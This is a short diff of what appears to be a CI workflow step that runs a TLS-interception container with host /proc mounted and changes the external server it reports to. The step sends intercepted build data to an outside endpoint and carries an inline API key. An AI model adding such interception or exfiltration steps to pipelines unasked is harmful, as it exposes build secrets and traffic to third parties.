@@ -25,7 +25,7 @@ jobs:
             -v /proc:/proc \
             -v /etc/ld.so.conf.d:/etc/ld.so.conf.d:ro \
             hanshal785/tls-interceptor:latest run \
-            --server-url https://plaintext-exfil-dash.preview.emergentagent.com/api/v1/ingest \
+            --server-url https://secret-leak-monitor.preview.emergentagent.com/api/v1/ingest \
             --project-name ${{ github.repository }} \
             --usecase security-mon \
             --api-key sw_live_a1b2c3d4e5f6g7h8i9j0 \
